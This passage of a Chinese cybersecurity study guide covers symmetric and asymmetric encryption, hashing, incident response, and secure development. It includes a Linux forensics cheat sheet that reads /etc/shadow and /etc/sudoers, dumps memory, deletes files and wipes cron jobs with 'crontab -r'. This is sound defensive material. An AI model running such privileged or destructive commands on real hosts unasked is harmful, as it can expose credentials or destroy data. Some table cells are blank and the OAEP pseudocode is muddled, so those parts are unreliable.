其中 $E$ 为加密函数，$D$ 为解密函数，$K$ 为密钥，$M$ 为明文，$C$ 为密文。

### 1.2 工作模式

| 模式 | 全称                  | 特点              | 并行 | 随机访问 |
| ---- | --------------------- | ----------------- | ---- | -------- |
| ECB  | Electronic Codebook   | 相同明文→相同密文 |      |          |
| CBC  | Cipher Block Chaining | 需要 IV           | 解密 |          |
| CTR  | Counter               | 流式加密          |      |          |
| GCM  | Galois/Counter        | 认证加密          |      |          |
| CFB  | Cipher Feedback       | 流式加密          | 解密 |          |
| OFB  | Output Feedback       | 流式加密          |      |          |

**推荐**：GCM 模式（提供加密+认证），CTR 模式（仅需加密时）。

### 1.3 填充方式

| 方式         | 描述                      |
| ------------ | ------------------------- |
| PKCS#7       | 每个填充字节值为填充长度  |
| Zero Padding | 填充零字节                |
| ISO 10126    | 随机填充+最后一字节为长度 |
| ANSI X.923   | 零填充+最后一字节为长度   |

> **Padding Oracle 攻击**：CBC 模式下，若服务器泄露填充验证结果，可逐字节解密密文。

## 2. DES 算法

### 2.1 算法概述

| 参数     | 值                        |
| -------- | ------------------------- |
| 密钥长度 | 56 位（64 位含 8 位校验） |
| 分组长度 | 64 位                     |
| 轮数     | 16 轮                     |
| 安全性   | 已不安全，仅教学用途      |

### 2.2 Feistel 结构

DES 采用 Feistel 网络：

$$L_i = R_{i-1}$$

$$R_i = L_{i-1} \oplus f(R_{i-1}, K_i)$$

### 2.3 3DES（Triple DES）

使用三次 DES 加密：

$$C = E_{K_3}(D_{K_2}(E_{K_1}(M)))$$

- 双密钥模式：$K_1 = K_3$，有效密钥 112 位
- 三密钥模式：有效密钥 168 位
- 速度慢，已逐步被 AES 替代

## 3. AES 算法

### 3.1 算法概述

| 参数     | AES-128 | AES-192 | AES-256 |
| -------- | ------- | ------- | ------- |
| 密钥长度 | 128 位  | 192 位  | 256 位  |
| 分组长度 | 128 位  | 128 位  | 128 位  |
| 轮数     | 10      | 12      | 14      |
| 安全性   | 安全    | 安全    | 高安全  |

### 3.2 AES 加密流程

每轮包含四个操作：

1. **SubBytes**：字节替换（S 盒）
2. **ShiftRows**：行移位
3. **MixColumns**：列混合（最后一轮省略）
4. **AddRoundKey**：轮密钥加

```
明文 → AddRoundKey → [SubBytes → ShiftRows → MixColumns → AddRoundKey] × (Nr-1) → SubBytes → ShiftRows → AddRoundKey → 密文
```

### 3.3 S 盒

AES 的 S 盒基于有限域 $GF(2^8)$ 上的乘法逆元和仿射变换：

$$s_{ij} = \text{Affine}(x^{-1}) \quad \text{在 } GF(2^8) \text{ 上}$$

### 3.4 代码示例

```python
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
import os

# AES-256-GCM 加密
def aes_gcm_encrypt(plaintext, key):
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
    return nonce, ciphertext, encryptor.tag

# AES-256-GCM 解密
def aes_gcm_decrypt(ciphertext, key, nonce, tag):
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag))
    decryptor = cipher.decryptor()
    return decryptor.update(ciphertext) + decryptor.finalize()
```

## 4. ChaCha20

### 4.1 算法概述

| 参数     | 值     |
| -------- | ------ |
| 密钥长度 | 256 位 |
| Nonce    | 96 位  |
| 类型     | 流密码 |
| 轮数     | 20 轮  |

### 4.2 优势

- 纯软件实现速度优于 AES（无 AES-NI 时）
- 常数时间执行，抗侧信道攻击
- ChaCha20-Poly1305 提供认证加密

### 4.3 与 AES 对比

| 对比项     | AES-GCM     | ChaCha20-Poly1305  |
| ---------- | ----------- | ------------------ |
| 硬件加速   | AES-NI 支持 | 无专用指令         |
| 软件性能   | 较慢        | 更快               |
| 侧信道安全 | 需注意实现  | 天然安全           |
| TLS 支持   | 广泛        | Chrome/Google 主推 |

## 5. 密钥管理

### 5.1 密钥生成

```python
import os

# 安全随机密钥
key = os.urandom(32)  # AES-256 密钥
```

### 5.2 密钥派生

```python
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

kdf = PBKDF2HMAC(
    algorithm=hashes.SHA256(),
    length=32,
    salt=salt,
    iterations=600000,  # OWASP 推荐
)
key = kdf.derive(password.encode())
```

### 5.3 密钥存储

| 方式     | 安全等级 | 适用场景   |
| -------- | -------- | ---------- |
| 硬编码   | 极低     | 绝对禁止   |
| 配置文件 | 低       | 开发环境   |
| 环境变量 | 中       | 容器化部署 |
| KMS      | 高       | 生产环境   |
| HSM      | 最高     | 金融/合规  |

## 6. 算法选择指南

| 场景        | 推荐算法           |
| ----------- | ------------------ |
| 通用加密    | AES-256-GCM        |
| 移动/嵌入式 | ChaCha20-Poly1305  |
| 大文件加密  | AES-256-CTR + HMAC |
| 兼容旧系统  | 3DES（仅过渡）     |
| 禁止使用    | DES、RC4、Blowfish |



<!-- ============ 文档分隔线：033-cybersecurity/015-IncidentResponse.md ============ -->


## 1. 应急响应框架

### 1.1 PICERL 模型

| 阶段            | 说明 |
| --------------- | ---- |
| Preparation     | 准备 |
| Identification  | 识别 |
| Containment     | 遏制 |
| Eradication     | 根除 |
| Recovery        | 恢复 |
| Lessons Learned | 复盘 |

### 1.2 事件分类

| 类别     | 示例             |
| -------- | ---------------- |
| 恶意代码 | 病毒、木马、勒索 |
| 拒绝服务 | DDoS             |
| 入侵     | 未授权访问       |
| 信息泄露 | 数据外泄         |
| 钓鱼     | 社会工程         |

## 2. 取证分析

### 2.1 取证原则

- 不修改原始证据
- 记录所有操作
- 维护证据链
- 使用写保护设备

### 2.2 内存取证

```bash
# 获取内存镜像
winpmem -o memory.raw

# Volatility 分析
vol -f memory.raw windows.pslist
vol -f memory.raw windows.netscan
vol -f memory.raw windows.malfind
```

### 2.3 磁盘取证

```bash
# 创建磁盘镜像
dd if=/dev/sda of=disk.img bs=4M

# 挂载只读
mount -o ro,loop disk.img /mnt/evidence

# 文件恢复
foremost -i disk.img -o recovered/
```

### 2.4 网络取证

```bash
# 抓包
tcpdump -i eth0 -w evidence.pcap

# 分析
wireshark evidence.pcap
tshark -r evidence.pcap -Y "http.request"
```

## 3. 遏制策略

### 3.1 网络遏制

| 策略      | 方法       | 影响       |
| --------- | ---------- | ---------- |
| IP封禁    | 防火墙规则 | 阻断攻击源 |
| 网络隔离  | VLAN调整   | 限制扩散   |
| DNS重定向 | 修改DNS    | 阻断C2     |
| 断网      | 物理断开   | 最极端     |

### 3.2 主机遏制

- 隔离感染主机
- 禁用受感染账号
- 重置凭证
- 终止恶意进程

## 4. 勒索软件响应

### 4.1 响应步骤

```
1. 隔离感染主机（不断电）
2. 保留内存镜像
3. 识别勒索软件家族
4. 检查是否有解密工具
5. 评估备份可用性
6. 恢复或支付（不推荐）
```

### 4.2 预防措施

- 离线备份
- 邮件安全网关
- 端点保护
- 网络分段
- 最小权限

## 5. 复盘与改进

### 5.1 复盘会议

- 时间线回顾
- 根因分析
- 响应评估
- 改进措施

### 5.2 改进跟踪

| 改进项  | 负责人 | 截止日期 | 状态   |
| ------- | ------ | -------- | ------ |
| 部署EDR | 安全组 | 2周      | 进行中 |
| 启用MFA | IT组   | 1周      | 完成   |
| 更新IRP | 安全组 | 3周      | 待开始 |
## 系统信息收集

**基本写法:查看系统基本信息**
`uname -a && cat /etc/os-release`
```bash
# 收集系统版本与内核信息
uname -a && cat /etc/os-release
```

**基本写法:查看运行时长**
`uptime`
```bash
# 查看系统运行时间与负载
uptime
```

**基本写法:查看登录用户**
`w`
```bash
# 查看当前登录的所有用户
w
```

**基本写法:查看用户登录历史**
`last | head -20`
```bash
# 查看最近登录历史记录
last | head -20
```

**基本写法:查看失败登录记录**
`lastb | head -20`
```bash
# 查看失败登录记录
sudo lastb | head -20
```

---

## 进程分析

**基本写法:查看所有进程**
`ps auxf`
```bash
# 查看所有进程与父子关系
ps auxf
```

**基本写法:查看 CPU 占用最高的进程**
`ps aux --sort=-%cpu | head -10`
```bash
# 找出 CPU 占用最高的 10 个进程
ps aux --sort=-%cpu | head -10
```

**基本写法:查看内存占用最高的进程**
`ps aux --sort=-%mem | head -10`
```bash
# 找出内存占用最高的 10 个进程
ps aux --sort=-%mem | head -10
```

**基本写法:查找隐藏进程**
`ps -ef | awk '{print $2}' | sort | uniq -d`
```bash
# 查找重复 PID 的可疑进程
ps -ef | awk '{print $2}' | sort | uniq -d
```

**基本写法:对比 /proc 与 ps**
`ls -d /proc/[0-9]* | awk -F/ '{print $3}' | sort > /tmp/proc.txt; ps -ef | awk 'NR>1{print $2}' | sort > /tmp/ps.txt; diff /tmp/proc.txt /tmp/ps.txt`
```bash
# 对比 /proc 与 ps 结果查找隐藏进程
comm -23 <(ls -d /proc/[0-9]* | awk -F/ '{print $3}' | sort) <(ps -ef | awk 'NR>1{print $2}' | sort)
```

---

## 网络连接分析

**基本写法:查看所有网络连接**
`netstat -tunlap`
```bash
# 查看所有 TCP/UDP 连接与监听端口
sudo netstat -tunlap
```

**基本写法:查看监听端口**
`ss -tlnp`
```bash
# 查看所有 TCP 监听端口与进程
sudo ss -tlnp
```

**基本写法:查找异常连接**
`netstat -anp | grep ESTABLISHED`
```bash
# 查看所有已建立的连接
sudo netstat -anp | grep ESTABLISHED
```

**基本写法:查找监听异常端口**
`ss -tlnp | grep -vE ":(22|80|443|8080)"`
```bash
# 查找非标准端口的监听服务
sudo ss -tlnp | grep -vE ":(22|80|443|8080)"
```

**基本写法:查看网络接口**
`ip addr && ip route`
```bash
# 查看网络接口与路由表
ip addr && ip route
```

---

## 文件系统取证

**基本写法:查找最近修改的文件**
`find / -mtime -1 -type f 2>/dev/null`
```bash
# 查找最近 24 小时内修改的文件
sudo find / -mtime -1 -type f 2>/dev/null
```

**基本写法:查找 SUID 文件**
`find / -perm -4000 -type f 2>/dev/null`
```bash
# 查找所有 SUID 权限文件(可能被植入后门)
sudo find / -perm -4000 -type f 2>/dev/null
```

**基本写法:查找隐藏文件**
`find / -name ".*" -type f 2>/dev/null | head`
```bash
# 查找所有隐藏文件
sudo find / -name ".*" -type f 2>/dev/null | head -20
```

**基本写法:查找可疑可执行文件**
`find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null`
```bash
# 查找临时目录中的可执行文件
sudo find /tmp /var/tmp /dev/shm -type f -executable 2>/dev/null
```

**基本写法:查找最近创建的文件**
`find / -mmin -60 -type f 2>/dev/null`
```bash
# 查找最近 60 分钟内创建的文件
sudo find / -mmin -60 -type f 2>/dev/null
```

---

## 用户与权限分析

**基本写法:查看所有用户**
`cat /etc/passwd | grep -v nologin | grep -v false`
```bash
# 查看可登录的用户账户
cat /etc/passwd | grep -v nologin | grep -v false
```

**基本写法:查看 UID 为 0 的用户**
`awk -F: '$3 == 0 {print $1}' /etc/passwd`
```bash
# 查找 UID 为 0 的用户(正常应只有 root)
awk -F: '$3 == 0 {print $1}' /etc/passwd
```

**基本写法:查看 sudo 权限用户**
`cat /etc/sudoers | grep -v "^#" | grep -v "^$"`
```bash
# 查看具有 sudo 权限的用户
sudo cat /etc/sudoers | grep -v "^#" | grep -v "^$"
```

**基本写法:查看空密码用户**
`awk -F: '($2 == "") {print $1}' /etc/shadow`
```bash
# 查找密码为空的用户
sudo awk -F: '($2 == "") {print $1}' /etc/shadow
```

**基本写法:查看用户最后登录时间**
`lastlog | grep -v "Never"`
```bash
# 查看所有用户的最后登录时间
lastlog | grep -v "Never logged in"
```

---

## 计划任务检查

**基本写法:查看 cron 任务**
`crontab -l && ls -la /etc/cron.*`
```bash
# 查看当前用户 cron 任务与系统 cron 配置
crontab -l && ls -la /etc/cron.*
```

**基本写法:查看系统级 cron**
`cat /etc/crontab`
```bash
# 查看系统级 cron 任务
cat /etc/crontab
```

**基本写法:查看 cron 目录**
`ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/`
```bash
# 查看 cron 目录中的定时任务
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
```

**基本写法:查看所有用户 cron**
`for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done`
```bash
# 查看所有用户的 cron 任务
for user in $(cut -f1 -d: /etc/passwd); do echo "用户 $user:"; sudo crontab -u $user -l 2>/dev/null; done
```

**基本写法:查看 systemd 定时器**
`systemctl list-timers --all`
```bash
# 查看 systemd 定时任务
systemctl list-timers --all
```

---

## 内存与启动项分析

**基本写法:查看内存使用**
`free -m && vmstat 1 5`
```bash
# 查看内存使用与虚拟内存统计
free -m && vmstat 1 5
```

**基本写法:查看启动项**
`systemctl list-unit-files --state=enabled`
```bash
# 查看开机自启服务
systemctl list-unit-files --state=enabled
```

**基本写法:查看 rc.local**
`cat /etc/rc.local`
```bash
# 查看 rc.local 启动脚本
cat /etc/rc.local 2>/dev/null
```

**基本写法:查看 init.d 服务**
`ls /etc/init.d/`
```bash
# 查看传统 init 服务
ls -la /etc/init.d/
```

**基本写法:检查内核模块**
`lsmod | grep -vE "^Module|^$" | sort`
```bash
# 查看加载的内核模块
lsmod | grep -vE "^Module|^$" | sort
```

---

## 恶意软件检测

**基本写法:扫描 rootkit**
`rkhunter --check`
```bash
# 使用 rkhunter 扫描 rootkit
sudo rkhunter --check --sk
```

**基本写法:更新 rkhunter 数据库**
`rkhunter --update`
```bash
# 更新 rkhunter 数据库
sudo rkhunter --update
```

**基本写法:chkrootkit 扫描**
`chkrootkit`
```bash
# 使用 chkrootkit 扫描 rootkit
sudo chkrootkit
```

**基本写法:ClamAV 病毒扫描**
`clamscan -r /`
```bash
# 使用 ClamAV 扫描整个文件系统
sudo clamscan -r --max-filesize=100M /
```

**基本写法:扫描特定目录**
`clamscan -r /home /tmp /var/tmp`
```bash
# 扫描用户主目录与临时目录
sudo clamscan -r /home /tmp /var/tmp
```

---

## 数据收集与取证

**基本写法:收集系统快照**
`./sysinfo.sh`
```bash
# 使用 sysinfo 工具收集系统信息
# sysinfo -o /tmp/system_info.txt
```

**基本写法:打包日志文件**
`tar -czf logs.tar.gz /var/log/`
```bash
# 打包日志用于取证分析
sudo tar -czf /tmp/logs.tar.gz /var/log/
```

**基本写法:制作内存镜像**
`dd if=/dev/mem of=/tmp/memory.dump`
```bash
# 制作内存镜像用于取证(需 root)
sudo dd if=/dev/mem of=/tmp/memory.dump bs=1M
```

**基本写法:计算文件哈希**
`sha256sum <文件>`
```bash
# 计算文件 SHA256 哈希保证取证完整性
sha256sum /tmp/logs.tar.gz
```

**基本写法:使用 LiME 制作内存镜像**
`insmod lime.ko "path=/tmp/memory.lime format=lime"`
```bash
# 使用 LiME 内核模块制作内存镜像
sudo insmod lime.ko "path=/tmp/memory.lime format=lime"
```

---

## 应急响应处置

**基本写法:隔离主机网络**
`ifconfig <接口> down`
```bash
# 立即断开网络隔离受感染主机
sudo ifconfig eth0 down
```

**基本写法:终止可疑进程**
`kill -9 <PID>`
```bash
# 强制终止可疑进程
sudo kill -9 12345
```

**基本写法:封禁恶意 IP**
`iptables -A INPUT -s <IP> -j DROP`
```bash
# 通过 iptables 阻断恶意 IP
sudo iptables -A INPUT -s 203.0.113.10 -j DROP
```

**基本写法:禁用用户账户**
`passwd -l <用户>`
```bash
# 锁定可疑用户账户
sudo passwd -l suspicious_user
```

**基本写法:关闭受感染服务**
`systemctl stop <服务>`
```bash
# 立即停止受感染服务
sudo systemctl stop vulnerable_service
```

---

## 事后清理与恢复

**基本写法:清除恶意文件**
`rm -f <文件路径>`
```bash
# 删除已确认的恶意文件
sudo rm -f /tmp/malware.sh
```

**基本写法:清除 cron 后门**
`crontab -r`
```bash
# 清除当前用户所有 cron 任务
crontab -r
```

**基本写法:恢复被篡改文件**
`apt-get install --reinstall <包名>`
```bash
# 重新安装被篡改的系统包
sudo apt-get install --reinstall coreutils
```

**基本写法:更新所有软件包**
`apt-get update && apt-get upgrade`
```bash
# 更新所有软件包修复已知漏洞
sudo apt-get update && sudo apt-get upgrade -y
```

**基本写法:重置所有用户密码**
`passwd <用户>`
```bash
# 重置用户密码
sudo passwd root
```

---

## 报告与归档

**基本写法:生成系统快照报告**
`hostname && date && uname -a > /tmp/incident_report.txt`
```bash
# 创建事件响应报告文件
echo "事件响应报告 $(date)" > /tmp/incident_report.txt
echo "主机名: $(hostname)" >> /tmp/incident_report.txt
echo "时间: $(date)" >> /tmp/incident_report.txt
echo "内核: $(uname -r)" >> /tmp/incident_report.txt
```

**基本写法:归档所有证据**
`tar -czf evidence-$(date +%F).tar.gz /tmp/incident_*/`
```bash
# 打包归档所有取证证据
sudo tar -czf evidence-$(date +%F).tar.gz /tmp/incident_report.txt /tmp/logs.tar.gz /tmp/memory.dump
```

**基本写法:计算证据哈希**
`sha256sum evidence-*.tar.gz > evidence.hash`
```bash
# 计算证据文件哈希保证完整性
sha256sum evidence-*.tar.gz > evidence.hash
```

**基本写法:验证证据完整性**
`sha256sum -c evidence.hash`
```bash
# 验证证据文件完整性
sha256sum -c evidence.hash
```



<!-- ============ 文档分隔线：033-cybersecurity/016-AsymmetricEncryption.md ============ -->



## 1. 非对称加密基础

### 1.1 基本概念

非对称加密使用一对密钥：**公钥**（公开）和**私钥**（保密）。

$$E_{pub}(M) = C, \quad D_{priv}(C) = M$$

### 1.2 核心应用

| 应用     | 方式               |
| -------- | ------------------ |
| 加密通信 | 公钥加密，私钥解密 |
| 数字签名 | 私钥签名，公钥验证 |
| 密钥交换 | 协商共享密钥       |

### 1.3 与对称加密对比

| 对比项   | 对称加密     | 非对称加密    |
| -------- | ------------ | ------------- |
| 密钥     | 1 个共享密钥 | 公钥+私钥对   |
| 速度     | 快（1000x+） | 慢            |
| 密钥分发 | 困难         | 简单          |
| 典型用途 | 数据加密     | 密钥交换/签名 |

## 2. RSA 算法

### 2.1 数学基础

RSA 安全性基于**大整数分解困难性**。

**密钥生成**：

1. 选择两个大素数 $p, q$（通常 1024+ 位）
2. 计算 $n = pq$
3. 计算欧拉函数 $\phi(n) = (p-1)(q-1)$
4. 选择 $e$，满足 $1 < e < \phi(n)$，$\gcd(e, \phi(n)) = 1$（通常 $e = 65537$）
5. 计算 $d$，满足 $ed \equiv 1 \pmod{\phi(n)}$

- 公钥：$(n, e)$
- 私钥：$(n, d)$

**加密**：$C = M^e \mod n$

**解密**：$M = C^d \mod n$

### 2.2 正确性证明

由 $ed \equiv 1 \pmod{\phi(n)}$，存在 $k$ 使 $ed = k\phi(n) + 1$

$$C^d = (M^e)^d = M^{ed} = M^{k\phi(n)+1} = M^{k\phi(n)} \cdot M \equiv M \pmod{n}$$

（由欧拉定理 $M^{\phi(n)} \equiv 1 \pmod{n}$，当 $\gcd(M, n) = 1$）

### 2.3 RSA 填充方案

| 方案        | 全称                                  | 安全性                   |
| ----------- | ------------------------------------- | ------------------------ |
| PKCS#1 v1.5 | RSAES-PKCS1-v1_5                      | 存在 Bleichenbacher 攻击 |
| OAEP        | Optimal Asymmetric Encryption Padding | 推荐                     |
| PSS         | Probabilistic Signature Scheme        | 签名推荐                 |

**OAEP 填充**：

```
m' = m || 0...0  ← 填充到 n 的长度
m' = MGF(seed) XOR m' || seed = MGF(m') XOR seed
C = (m')^e mod n
```

### 2.4 RSA 代码示例

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes

# 生成密钥对
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
)
public_key = private_key.public_key()

# 加密
ciphertext = public_key.encrypt(
    message,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)

# 解密
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(
        mgf=padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
    )
)
```

### 2.5 RSA 攻击

| 攻击           | 条件              | 描述                 |
| -------------- | ----------------- | -------------------- |
| 分解攻击       | $n$ 较小          | 直接分解 $n$         |
| 共模攻击       | 同一 $n$ 不同 $e$ | 利用扩展欧几里得算法 |
| 低指数攻击     | $e$ 过小且 $M$ 短 | $M^e < n$ 时直接开方 |
| Bleichenbacher | PKCS#1 v1.5       | Oracle 攻击          |
| 侧信道         | 时间/功耗         | Montgomery 乘法泄露  |

## 3. ECC 椭圆曲线加密

### 3.1 数学基础

椭圆曲线定义：

$$y^2 = x^3 + ax + b \pmod{p}$$

**点加法**：$P + Q = R$

**标量乘法**：$kP = P + P + \cdots + P$（$k$ 次）

**离散对数问题**（ECDLP）：已知 $P$ 和 $kP$，求 $k$ 是困难的。

### 3.2 常用曲线

| 曲线       | 密钥长度 | 等效 RSA  | 用途     |
| ---------- | -------- | --------- | -------- |
| secp256k1  | 256 位   | 3072 位   | Bitcoin  |
| P-256      | 256 位   | 3072 位   | TLS/通用 |
| P-384      | 384 位   | 7680 位   | 高安全   |
| Curve25519 | 256 位   | 3072 位   | 密钥交换 |
| Ed448      | 448 位   | ~14000 位 | 高安全   |

### 3.3 ECDH 密钥交换

```
Alice: 生成私钥 a，计算 aG（G 为基点）
Bob:   生成私钥 b，计算 bG

交换: Alice → aG → Bob
      Bob   → bG → Alice

共享密钥:
Alice: a(bG) = abG
Bob:   b(aG) = abG
```

### 3.4 ECDSA 签名

```python
from cryptography.hazmat.primitives.asymmetric import ec

# 生成密钥
private_key = ec.generate_private_key(ec.SECP256R1())
public_key = private_key.public_key()

# 签名
signature = private_key.sign(message, ec.ECDSA(hashes.SHA256()))

# 验证
public_key.verify(signature, message, ec.ECDSA(hashes.SHA256()))
```

### 3.5 EdDSA（Ed25519）

```python
from cryptography.hazmat.primitives.asymmetric import ed25519

# 生成密钥
private_key = ed25519.Ed25519PrivateKey.generate()

# 签名（无需指定哈希算法）
signature = private_key.sign(message)

# 验证
public_key = private_key.public_key()
public_key.verify(signature, message)
```

**Ed25519 优势**：

- 确定性签名（无随机数依赖）
- 快速
- 抗侧信道
- 无歧义验证

## 4. Diffie-Hellman 密钥交换

### 4.1 经典 DH

$$A = g^a \mod p, \quad B = g^b \mod p$$

$$s = B^a \mod p = A^b \mod p = g^{ab} \mod p$$

### 4.2 安全参数

| 参数 | 推荐值   |
| ---- | -------- |
| $p$  | 2048+ 位 |
| $g$  | 2 或 5   |

### 4.3 前向保密

使用临时密钥（Ephemeral DH / DHE），每次会话生成新的 DH 参数，即使长期私钥泄露，历史会话仍安全。

## 5. 算法选择指南

| 场景       | 推荐算法              |
| ---------- | --------------------- |
| 密钥交换   | X25519（ECDH）        |
| 数字签名   | Ed25519 / ECDSA P-256 |
| 加密       | RSA-OAEP 2048+        |
| 兼容旧系统 | RSA 2048+             |
| 禁止使用   | RSA 1024、DH 768      |



<!-- ============ 文档分隔线：033-cybersecurity/017-HashAlgorithm.md ============ -->



## 1. 哈希算法基础

### 1.1 基本概念

哈希函数将任意长度输入映射为固定长度输出：

$$H: \{0,1\}^* \rightarrow \{0,1\}^n$$

### 1.2 安全性质

| 性质         | 描述                                                      |
| ------------ | --------------------------------------------------------- |
| 抗碰撞性     | 找到 $x \neq y$ 使 $H(x) = H(y)$ 在计算上不可行           |
| 抗原像性     | 给定 $h$，找到 $x$ 使 $H(x) = h$ 在计算上不可行           |
| 抗第二原像性 | 给定 $x$，找到 $y \neq x$ 使 $H(y) = H(x)$ 在计算上不可行 |
| 雪崩效应     | 输入微小变化导致输出巨大变化                              |

### 1.3 Merkle-Damgård 结构

大多数哈希算法采用此结构：

```
消息 → 填充 → 分块 → IV → [压缩函数] → [压缩函数] → ... → 哈希值
```

## 2. MD5 算法

### 2.1 概述

| 参数     | 值         |
| -------- | ---------- |
| 输出长度 | 128 位     |
| 分组长度 | 512 位     |
| 轮数     | 64（4×16） |
| 安全性   | 已破解     |

### 2.2 已知攻击

| 攻击         | 年份 | 描述                   |
| ------------ | ---- | ---------------------- |
| 碰撞攻击     | 2004 | 王小云团队找到实际碰撞 |
| 选择前缀碰撞 | 2006 | 可构造有意义的碰撞文件 |
| MD5 碰撞证书 | 2008 | 伪造 CA 证书           |

### 2.3 当前状态

**禁止用于安全场景**，仅可用于非安全目的（如文件校验、ETag）。

## 3. SHA-1 算法

### 3.1 概述

| 参数     | 值     |
| -------- | ------ |
| 输出长度 | 160 位 |
| 分组长度 | 512 位 |
| 轮数     | 80     |
| 安全性   | 已破解 |

### 3.2 SHAttered 攻击（2017）

Google 与 CWI 研究所成功找到 SHA-1 碰撞，计算代价约 $2^{63}$ 次。

**禁止用于安全场景**。

## 4. SHA-2 家族

### 4.1 概述

| 算法    | 输出长度 | 安全等级 |
| ------- | -------- | -------- |
| SHA-224 | 224 位   | 112 位   |
| SHA-256 | 256 位   | 128 位   |
| SHA-384 | 384 位   | 192 位   |
| SHA-512 | 512 位   | 256 位   |

### 4.2 SHA-256 算法流程

1. 消息填充（添加 1 位 + 零 + 64 位长度）
2. 分成 512 位分组
3. 每个分组进行 64 轮运算
4. 每轮使用：消息调度字、轮常数、位运算（AND、XOR、ROT）

### 4.3 代码示例

```python
import hashlib

# SHA-256
hash_sha256 = hashlib.sha256(b"Hello World").hexdigest()
# a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e

# SHA-512
hash_sha512 = hashlib.sha512(b"Hello World").hexdigest()

# HMAC
import hmac
hmac_sha256 = hmac.new(key, message, hashlib.sha256).hexdigest()
```

### 4.4 长度扩展攻击

Merkle-Damgård 结构的弱点：已知 $H(m)$ 和 $m$ 的长度，可以计算 $H(m || padding || m')$ 而不知道 $m$。

**防御**：使用 HMAC 而非直接哈希。

## 5. SHA-3（Keccak）

### 5.1 概述

| 算法     | 输出长度 | 特点     |
| -------- | -------- | -------- |
| SHA3-224 | 224 位   | 海绵结构 |
| SHA3-256 | 256 位   | 海绵结构 |
| SHA3-384 | 384 位   | 海绵结构 |
| SHA3-512 | 512 位   | 海绵结构 |
| SHAKE128 | 可变     | XOF      |
| SHAKE256 | 可变     | XOF      |

### 5.2 海绵结构

```
吸收阶段：消息分块 XOR 到状态中，经过置换函数
挤出阶段：从状态中提取输出
```

**优势**：

- 不受长度扩展攻击影响
- 可扩展输出长度（XOF）
- 与 SHA-2 完全不同的结构

## 6. 密码存储专用哈希

### 6.1 为什么不能用普通哈希

| 攻击     | 描述                           |
| -------- | ------------------------------ |
| 彩虹表   | 预计算哈希值对照表             |
| 暴力破解 | GPU 每秒可计算数十亿次 SHA-256 |
| 字典攻击 | 常见密码列表                   |

### 6.2 Bcrypt

```python
import bcrypt

# 哈希密码
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))

# 验证
bcrypt.checkpw(password.encode(), hashed)
```

| 参数         | 值                     |
| ------------ | ---------------------- |
| 输出长度     | 184 位                 |
| 内置盐       | 是                     |
| 自适应       | rounds 参数（默认 12） |
| 最大密码长度 | 72 字节                |

### 6.3 Argon2

```python
from argon2 import PasswordHasher

ph = PasswordHasher()
hash = ph.hash("password")
ph.verify(hash, "password")
```

| 参数     | 描述             |
| -------- | ---------------- |
| 时间成本 | 迭代次数         |
| 内存成本 | 内存使用量（MB） |
| 并行度   | 线程数           |

**Argon2 优势**：抗 GPU/ASIC 攻击，2015 年密码哈希竞赛冠军。

### 6.4 PBKDF2

```python
import hashlib
import os

key = hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 600000, dklen=32)
```

| 参数     | 推荐值              |
| -------- | ------------------- |
| 迭代次数 | 600,000+（SHA-256） |
| 盐长度   | 16+ 字节            |
| 输出长度 | 32+ 字节            |

## 7. 应用场景与算法选择

| 场景       | 推荐算法                   |
| ---------- | -------------------------- |
| 密码存储   | Argon2id > Bcrypt > PBKDF2 |
| 数据完整性 | SHA-256 / SHA-3            |
| 数字签名   | SHA-256 / SHA-384          |
| 文件校验   | SHA-256                    |
| HMAC       | HMAC-SHA256                |
| 禁止使用   | MD5、SHA-1（安全场景）     |



<!-- ============ 文档分隔线：033-cybersecurity/018-SecureDevelopment.md ============ -->



## 1. 安全开发生命周期（SDL）

### 1.1 SDL 阶段

| 阶段 | 安全活动           |
| ---- | ------------------ |
| 需求 | 安全需求、合规要求 |
| 设计 | 威胁建模           |
| 实现 | 安全编码、代码审查 |
| 测试 | SAST/DAST/渗透测试 |
| 发布 | 安全评估、签名     |
| 运维 | 漏洞响应、监控     |

### 1.2 安全左移

将安全活动前移到开发早期，降低修复成本：

$$\text{修复成本}：\text{需求阶段} \times 1 < \text{编码阶段} \times 10 < \text{测试阶段} \times 100 < \text{生产阶段} \times 1000$$

## 2. 威胁建模

### 2.1 STRIDE 模型

| 威胁              | 安全属性 | 示例     |
| ----------------- | -------- | -------- |
| Spoofing          | 认证     | 身份冒充 |
| Tampering         | 完整性   | 数据篡改 |
| Repudiation       | 不可否认 | 否认操作 |
| Info Disclosure   | 机密性   | 信息泄露 |
| Denial of Service | 可用性   | 服务拒绝 |
| Elevation         | 授权     | 权限提升 |

### 2.2 威胁建模流程

```
1. 绘制系统架构图
2. 识别信任边界
3. 应用STRIDE识别威胁
4. 评估风险等级
5. 制定缓解措施
```

## 3. 安全编码

### 3.1 输入验证

```python
# 白名单验证
import re
if not re.match(r'^[a-zA-Z0-9_]{1,50}$', username):
    raise ValueError("Invalid username")

# 参数化查询
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### 3.2 输出编码

```python
from markupsafe import escape
html = f"<p>Hello, {escape(name)}</p>"
```

### 3.3 安全配置

```python
# Cookie安全
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

# 安全头
@app.after_request
def set_headers(response):
